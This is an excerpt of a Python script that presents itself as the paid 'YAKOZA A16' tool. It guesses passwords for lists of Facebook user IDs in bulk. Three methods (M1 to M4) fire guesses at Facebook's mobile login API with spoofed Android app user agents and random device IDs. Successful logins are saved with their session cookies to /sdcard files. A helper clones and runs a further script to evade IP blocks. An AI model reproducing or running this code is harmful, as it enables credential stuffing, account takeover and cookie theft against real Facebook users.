...
os.system('xdg-open https://www.facebook.com/x_anes_x2.0.0.')
...
print('\033[1;37m[\033[1;31m=\033[1;37m] \033[1;32mWELLCOM TO YAKOZA A16 TOOL...')
...
def p(x):
	print(x)
os.system(f'xdg-open YAKOZA A16')

sys.stdout.write('\x1b]2; <YAKOZA>\x07')
logo=(f"""\033[1;32m
 db    db  .d8b.  db   dD  .d88b.  d88888D  .d8b.  
 `8b  d8' d8' `8b 88 ,8P' .8P  Y8. YP  d8' d8' `8b 
  `8bd8'  88ooo88 88,8P   88    88    d8'  88ooo88 
    88    88~~~88 88`8b   88    88   d8'   88~~~88 
    88    88   88 88 `88. `8b  d8'  d8' db 88   88 
    YP    YP   YP YP   YD  `Y88P'  d88888P YP   YP 
\033[1;32m••••••••••••••••••••••••••••••••••••••••••••••••••••••
\033[1;37m[\033[1;32m=\033[1;37m] \033[1;32mFACEBOK : \033[1;31mA.X. ANES MDAYNI
\033[1;37m[\033[1;32m=\033[1;37m] \033[1;32mGITHUB  : \033[1;32mYAKOZA
\033[1;37m[\033[1;32m=\033[1;37m] \033[1;32mSERVICE : \033[1;32mPAID
\033[1;37m[\033[1;32m=\033[1;37m] \033[1;32mVERSION : \033[1;32m3.21
\033[1;32m••••••••••••••••••••••••••••••••••••••••••••••••••••••
\033[1;37m[\033[1;32m=\033[1;37m] \033[1;32mCloning ids Saved in YAKOZA folder
\033[1;32m••••••••••••••••••••••••••••••••••••••••••••••••••••••""")
def linex():
    print('\033[1;32m••••••••••••••••••••••••••••••••••••••••••••••••••••••')
def clear():
...
def menu():
                        clear()	
                        print('\033[1;37m[\033[1;32m1\033[1;37m] \033[1;32mCRACK FILE ')
                        print('\033[1;37m[\033[1;32m2\033[1;37m] \033[1;32mCREAT FILE FB ')
                        print('\033[1;37m[\033[1;32m3\033[1;37m] \033[1;32mUNBLOCk NETWORk IP')
                        print('\033[1;37m[\033[1;32m4\033[1;37m] \033[1;32mWHATSAPP GROUP')
                        print('\033[1;37m[\033[1;32m5\033[1;37m] \033[1;32mTELEGRAM')
                        print('\033[1;37m[\033[1;32m6\033[1;37m] \033[1;32mFOLLOW FB')
                        print('\033[1;37m[\033[1;32m0\033[1;37m] \033[1;32mEXIT ')
                        linex()
                        xd=input('\033[1;37m[\033[1;32m=\033[1;37m] \033[1;32mChose : ')
                        if xd in ['1','01']:
                                clear()
                                ...
                                try:
                                        ...
                                        menu()
                                clear()
                                print(' \033[1;37m[\033[1;32m=\033[1;37m] \033[1;32mAll method working try 1 by 1 ')
                                linex()
                                print('\033[1;37m[\033[1;32m1\033[1;37m] \033[1;37mMethod ')
                                print('\033[1;37m[\033[1;32m2\033[1;37m] \033[1;37mMethod ')
                                ...
                                linex()
                                plist = []
                                print("\033[1;37m[\033[1;32m1\033[1;37m] \033[1;32mAuto Password  ")                                
                                print("\033[1;37m[\033[1;32m2\033[1;37m] \033[1;32mManual Password ") 
                                linex()
                                ...
                                if psx in ['1','01']:
                                        ...
                                        try:
                                                linex()
                                                ps_limit = int(input('\033[1;37m[\033[1;32m=\033[1;37m] \033[1;32mHow many passwords••• '))
                                        except:
                                                ps_limit =1
                                        linex()
                                        print('\033[1;37m[\033[1;32m=\033[1;37m] \033[1;32mexp: first last,firstlast,first123')
                                        linex()
                                        for i in range(ps_limit):
                                                plist.append(input(f' \033[1;37m[\033[1;32m=\033[1;37m] \033[1;32mPassword {i+1}: '))
                                      
                                linex()
                                print('\033[1;37m[\033[1;32m=\033[1;37m] \033[1;32mDo you went show cp account? (y/n): ')
                                linex()
                                ...
                                with tred(max_workers=30) as crack_submit:
                                        ...
                                        print('\033[1;37m[\033[1;32m=\033[1;37m] \033[1;32mTOTAL ID : \033[1;32m'+total_ids+f' ')
                                        print("\033[1;37m[\033[1;32m=\033[1;37m] \033[1;31mIF NO RESULT [ON/OFF] AIRPLAN MODE ")
                                        linex()
                                        for user in fo:
...
def M1(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m<[YAKOZA-M1]>♡<[%s|\033[1;32mOK:-%s\033[1;37m]> \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                        ...
                        for pw in passlist:
                                ...
                                ua = "[FBAN/FB4A;FBAV/"+str(random.randint(49,66))+'.0.0.'+str(random.randrange(20,49))+str(random.randint(11,99)) +";FBBV/"+str(random.randint(11111111,77777777))+";[FBAN/FB4A;FBAV/153.0.0.54.88;FBBV/84570982;FBDM/{density=2.0,width=720,height=1184};FBLC/pt_PT;FBRV/85070460;FBCR/altice MEO;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/G3121;FBSV/7.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]"
                                ...
                                if 'session_key' in q:
                                        ...
                                        print('\r\r\033[1;32m<[YAKOZA-OK]> '+ids+' | '+pas+'\033[1;97m')                 
                                        print("\033[1;33m [YAKOZA-🇩🇿] :\033[1;33m "+cookie)                                                   
                                        open('/sdcard/YAKOZA>OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/YAKOZA>koki.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')                      
                                        oks.append(ids)                           
                                        break                          
                                elif 'www.facebook.com' in q['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\033[1;34m<[YAKOZA-CP]> '+ids+' | '+pas+'\033[1;97m')
...
def M2(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m<[YAKOZA-M2]>♡<[%s|\033[1;32mOK:-%s\033[1;37m]> \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                        ...
                        for pw in passlist:
                                ...
                                ua = "[FBAN/FB4A;FBAV/"+str(random.randint(49,66))+'.0.0.'+str(random.randrange(20,49))+str(random.randint(11,99)) +";FBBV/"+str(random.randint(11111111,77777777))+";[FBAN/FB4A;FBAV/153.0.0.54.88;FBBV/84570982;FBDM/{density=2.0,width=720,height=1208};FBLC/pt_PT;FBRV/85070460;FBCR/NOS;FBMF/HUAWEI;FBBD/Huawei;FBPN/com.facebook.katana;FBDV/ALE-L21;FBSV/6.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]"
                                device_id = str(uuid.uuid4())
                                adid = str(uuid.uuid4())
                                data = {'adid':adid,
                                        'email':ids,
                                ...
                                if 'session_key' in q:
                                        ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}"                                	
                                        print('\r\r\033[1;32m<[YAKOZA-OK]> '+ids+' | '+pas+' | '+joined(uid)+'\033[1;97m') 
                                        print("\033[1;96m [YAKOZA-🇩🇿] :\033[1;37m "+cookie)           
                                        open('/sdcard/YAKOZA-ok.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/YAKOZA koki.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')                                        
                                        oks.append(ids)                                        
                                        break
...
def M3(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m<[YAKOZA-M3]>♡<[%s|\033[1;32mOK:-%s\033[1;37m]> \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                        ...
                        for pw in passlist:
                                ...
                                fban = random.choice(["FB4A", "FB5A", "FB6A"])
                                fbpn = random.choice(["com.facebook.katana", "com.facebook.orca","messenger-android", "com.facebook.lite"])
                                ua = "[FBAN/FB4A;FBAV/"+str(random.randint(49,66))+'.0.0.'+str(random.randrange(20,49))+str(random.randint(11,99)) +";FBBV/"+str(random.randint(11111111,77777777))+";[FBAN/FB4A;FBAV/153.0.0.54.88;FBBV/84570984;FBDM/{density=2.625,width=1080,height=2094};FBLC/ru_RU;FBRV/85070460;FBCR/NOS;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G955F;FBSV/7.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]"
                                device_id = str(uuid.uuid4())
                                adid = str(uuid.uuid4())
                                data = {'adid':adid,
                                        'email':ids,
                                ...
                                if 'session_key' in q:
                                        ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}"                                	
                                        print('\r\r\033[1;32m <[YAKOZA-OK]> '+ids+' | '+pas+' | '+joined(uid)+'\033[1;97m')            
                                        open('/sdcard/YAKOZA_m3_OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/YAKOZA koki.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')                                        
                                        oks.append(ids)                                        
                                        break
...
def M4(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m<[YAKOZA-M4]>♡<[%s|\033[1;32mOK:-%s\033[1;37m]> \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
...
'Content-Length': '706'}
                                ...
                                if 'session_key' in q:
                                        ...
                                        if 'y' in pcp:
                                                #print('\r\r\x1b[38;5;208m <[YAKOZA-CP]> '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/YAKOZA-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                        else:
...
def createip():
	os.system("cd && git clone https://github.com/YAKOZA/YAKOZA")
	os.system('cd && cd YAKOZA ;python IP16.py')
#####_____END_____#####
